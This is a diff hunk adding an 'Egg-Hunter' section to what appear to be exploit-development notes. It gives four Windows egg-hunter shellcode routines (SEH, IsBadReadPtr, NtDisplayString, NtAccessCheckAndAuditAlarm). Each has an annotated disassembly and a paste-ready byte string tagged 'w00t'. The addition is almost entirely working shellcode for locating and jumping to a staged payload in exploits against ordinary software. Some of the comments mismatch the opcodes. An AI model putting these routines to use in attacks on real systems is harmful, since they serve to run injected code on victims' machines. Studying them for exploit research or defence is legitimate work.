@@ -2322,6 +2322,126 @@ nasm > inc eax
 nasm > rol eax,8
 00000000  C1C008            rol eax,byte 0x8  ; 0x00000100  2文字分左にローテーションさせる
 ```
+##### Egg-Hunter
+Egg hunter using SEH injection   
+```txt
+# Egg hunter size = 60 bytes, Egg size = 8 bytes
+EB21       jmp short 0x23
+59         pop ecx
+B890509050 mov eax,0x50905090  ; this is the tag
+51         push ecx
+6AFF       push byte -0x1
+33DB       xor ebx,ebx
+648923     mov [fs:ebx],esp
+6A02       push byte +0x2
+59         pop ecx
+8BFB       mov edi,ebx
+F3AF       repe scasd
+7507       jnz 0x20
+FFE7       jmp edi
+6681CBFF0F or bx,0xfff
+43         inc ebx
+EBED       jmp short 0x10
+E8DAFFFFFF call 0x2
+6A0C       push byte +0xc
+59         pop ecx
+8B040C     mov eax,[esp+ecx]
+B1B8       mov cl,0xb8
+83040806   add dword [eax+ecx],byte +0x6
+58         pop eax
+83C410     add esp,byte+0x10
+50         push eax
+33C0       xor eax,eax
+C3         ret
+
+egghunter = "\xeb\x21\x59\xb8"
+egghunter += "w00t"
+egghunter += "\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb"
+egghunter += "\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb"
+egghunter += "\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1"
+egghunter += "\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3"
+```
+Egg hunter using IsBadReadPtr   
+```txt
+# Egg hunter size = 37 bytes, Egg size = 8 bytes
+33DB       xor ebx,ebx
+6681CBFF0F or bx,0xfff
+43         inc ebx
+6A08       push byte +0x8
+53         push ebx
+B80D5BE777 mov eax,0x77e75b0d
+FFD0       call eax
+85C0       test eax,eax
+75EC       jnz 0x2
+B890509050 mov eax,0x50905090 ; this is the tag
+8BFB       mov edi,ebx
+AF         scasd
+75E7       jnz 0x7
+AF         scasd
+75E4       jnz0x7
+FFE7       jmp edi
+
+egghunter = "\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08"
+egghunter += "\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8"
+egghunter += "w00t"
+egghunter += "\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
+```
+Egg hunter using NtDisplayString   
+```txt
+# Egg hunter size = 32 bytes, Egg size = 8 bytes
+6681CAFF0F  or dx,0x0fff
+42          inc edx
+52          push edx
+6A43        push byte +0x43   ; NtDisplayStringのsyscall番号
+58          pop eax
+CD2E        int 0x2e
+3C05        cmp al,0x5
+5A          pop edx
+74EF        jz 0x0
+B890509050  mov eax,0x50905090  ; this is the tag
+8BFA        mov edi,edx
+AF          scasd
+75EA        jnz 0x5
+AF          scasd
+75E7        jnz 0x5
+FFE7        jmp edi
+
+egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
+egghunter += "w00t"
+egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+```
+Egg hunter using NtAccessCheck (AndAuditAlarm)   
+```txt
+# Egg hunter size = 32 bytes, Egg size = 8 bytes
+6681CAFF0F  or dx,0x0fff   ; get last address in page
+42          inc edx        ; acts as a counter
+                           ;(increments the value in EDX)
+52          push edx       ; pushes edx value to the  stack
+                           ;(saves our current address on the stack)
+6A43        push byte +0x2 ; push 0x2 for NtAccessCheckAndAuditAlarm
+                           ; or 0x43 for NtDisplayString to stack
+58          pop eax        ; pop 0x2 or 0x43 into eax
+                           ; so it can be used as parameter
+                           ; to syscall - see next
+CD2E        int 0x2e       ; tell the kernel i want a do a
+                           ; syscall using previous register
+3C05        cmp al,0x5     ; check if access violation occurs
+                           ;(0xc0000005== ACCESS_VIOLATION) 5
+5A          pop edx        ; restore edx
+74EF        je xxxx        ; jmp back to start dx 0x0fffff
+B890509050  mov eax,0x50905090 ; this is the tag (egg)
+8BFA        mov edi,edx    ; set edi to our pointer
+AF          scasd          ; compare for status
+75EA        jnz xxxxxx     ; (back to inc edx) check egg found or not
+AF          scasd          ; when egg has been found
+75E7        jnz xxxxx      ; (jump back to "inc edx")
+                           ; if only the first egg was found
+FFE7       jmp edi         ; edi points to begin of the shellcode
+
+egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
+egghunter += "\x77\x30\x30\x74" # this is the marker/tag: w00t
+egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+```
 #### Windows周り
 - `arwin`   
 ```txt
